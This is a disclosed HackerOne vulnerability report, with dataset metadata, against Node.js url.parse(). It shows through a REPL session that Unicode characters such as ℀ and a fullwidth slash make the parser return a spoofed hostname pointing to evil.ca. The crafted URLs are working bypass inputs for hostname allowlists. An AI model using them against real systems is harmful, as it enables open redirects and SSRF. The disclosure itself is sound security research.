---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '678487'
original_report_id: '678487'
title: Hostname spoofing
team_handle: nodejs
created_at: '2019-08-21T12:48:39.763Z'
disclosed_at: '2020-01-10T03:28:48.202Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 3
asset_identifier: https://github.com/nodejs/node
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
---

# Hostname spoofing

## Metadata

- HackerOne Report ID: 678487
- Weakness: 
- Program: nodejs
- Disclosed At: 2020-01-10T03:28:48.202Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

**Summary:**
I found that url.parse() is vulnerable to hostsplit that causes hostname spoofing.

**Description:**
## Steps To Reproduce:

`url.parse('http://evil.c℀.victim.test/?')` returns `evil.ca/c.victim.test` as hostname, so this hostname matches `*.victim.test` but will access `evil.ca`.

```
Welcome to Node.js v12.9.0.
Type ".help" for more information.
> url = require('url')
{
  Url: [Function: Url],
  parse: [Function: urlParse],
  resolve: [Function: urlResolve],
  resolveObject: [Function: urlResolveObject],
  format: [Function: urlFormat],
  URL: [Function: URL],
  URLSearchParams: [Function: URLSearchParams],
  domainToASCII: [Function: domainToASCII],
  domainToUnicode: [Function: domainToUnicode],
  pathToFileURL: [Function: pathToFileURL],
  fileURLToPath: [Function: fileURLToPath]
}
> url.parse('http://evil.c℀.victim.test/?')
Url {
  protocol: 'http:',
  slashes: true,
  auth: null,
  host: 'evil.ca/c.victim.test',
  port: null,
  hostname: 'evil.ca/c.victim.test',
  hash: null,
  search: '?',
  query: '',
  pathname: '/',
  path: '/?',
  href: 'http://evil.ca/c.victim.test/?'
}
> url.parse('http://a.com／.b.com/')
Url {
  protocol: 'http:',
  slashes: true,
  auth: null,
  host: 'a.com/.b.com',
  port: null,
  hostname: 'a.com/.b.com',
  hash: null,
  search: null,
  query: null,
  pathname: '/',
  path: '/',
  href: 'http://a.com/.b.com/'
}
```

## Impact
- Hostname spoofing may cause openredirect, ssrf, etc...

## Supporting Material/References:
- This is the material about hostsplit
  - https://www.blackhat.com/us-19/briefings/schedule/#hostsplit-exploitable-antipatterns-in-unicode-normalization-14786

## Impact

Hostname spoofing may cause openredirect, ssrf, etc...

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
